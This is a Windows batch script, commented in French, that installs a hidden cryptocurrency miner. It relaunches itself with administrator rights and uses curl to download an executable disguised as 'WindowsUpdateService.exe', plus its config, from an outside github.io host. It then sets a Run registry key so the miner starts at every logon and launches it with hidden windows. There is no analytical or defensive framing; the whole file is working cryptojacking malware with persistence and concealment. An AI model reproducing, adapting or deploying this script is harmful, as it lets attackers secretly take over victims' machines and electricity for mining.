@echo off
:: ===============================
:: Script d'installation pour mineur furtif
:: ===============================

:: Vérifie les droits administratifs
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement...
    powershell -Command "Start-Process -FilePath '%~0' -Verb RunAs"
    exit /b
)

:: Variables
set LOGFILE=%TEMP%\miner_install_log.txt
set MINER_URL=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
set CONFIG_URL=https://outof-ctrl.github.io/Outof-repo/config.json
set MINER_PATH=%APPDATA%\WinUS
set MINER_EXEC=WindowsUpdateService.exe
set MINER_CONFIG=config.json

:: Journalisation
echo [INFO] Début de l'installation > "%LOGFILE%"
echo [INFO] Vérification des droits administratifs... >> "%LOGFILE%"

:: Crée le répertoire de destination
if not exist "%MINER_PATH%" (
    mkdir "%MINER_PATH%"
    echo [INFO] Répertoire %MINER_PATH% créé. >> "%LOGFILE%"
) else (
    echo [INFO] Répertoire %MINER_PATH% existe déjà. >> "%LOGFILE%"
)

:: Télécharge le mineur furtif
echo [INFO] Téléchargement du mineur... >> "%LOGFILE%"
curl -o "%MINER_PATH%\%MINER_EXEC%" %MINER_URL% >> "%LOGFILE%" 2>&1

:: Télécharge le fichier de configuration
echo [INFO] Téléchargement du fichier de configuration... >> "%LOGFILE%"
curl -o "%MINER_PATH%\%MINER_CONFIG%" %CONFIG_URL% >> "%LOGFILE%" 2>&1

:: Ajoute le mineur au démarrage via le registre
echo [INFO] Ajout du mineur au démarrage... >> "%LOGFILE%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%MINER_PATH%\%MINER_EXEC%\" --config %MINER_PATH%\%MINER_CONFIG%" /f >> "%LOGFILE%" 2>&1

:: Lancement furtif du mineur
echo [INFO] Lancement du mineur en mode furtif... >> "%LOGFILE%"
powershell -WindowStyle Hidden -Command "Start-Process '%MINER_PATH%\%MINER_EXEC%' -ArgumentList '--config %MINER_PATH%\%MINER_CONFIG%' -WindowStyle Hidden" >> "%LOGFILE%" 2>&1

:: Fin
echo [SUCCES] Installation terminée. >> "%LOGFILE%"
exit /b
